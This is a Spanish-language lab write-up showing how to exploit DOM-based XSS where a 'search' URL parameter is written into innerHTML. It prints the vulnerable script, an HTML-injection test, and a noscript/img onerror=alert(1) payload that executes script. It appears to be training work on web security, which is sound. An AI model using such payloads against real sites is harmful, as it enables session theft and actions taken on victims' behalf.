# DOM XSS in innerHTML sink using source location.search

En este laboratorio tenemos que explotar el `innerHTML` y su mala implementación.

![20240806131449.png](20240806131449.png)

Se tiene el siguiente script que se ejecuta cuando se realiza una busqueda

```c
 function doSearchQuery(query) {
	 document.getElementById('searchMessage').innerHTML = query;
	 }
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
	doSearchQuery(query);
	}

```

Usaremos el siguiente código de HTML para realizar la búsqueda

```c
<li><a href="#">Item 1</a></li>
```

![20240806132524.png](20240806132524.png)

Luego de enviar la petición podemos observar que se nos interpreta el código html que ingresamos.

![20240806132559.png](20240806132559.png)

Ahora podemos hacer uso del siguiente payload para ejecutar código html

```c
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

![20240806132620.png](20240806132620.png)

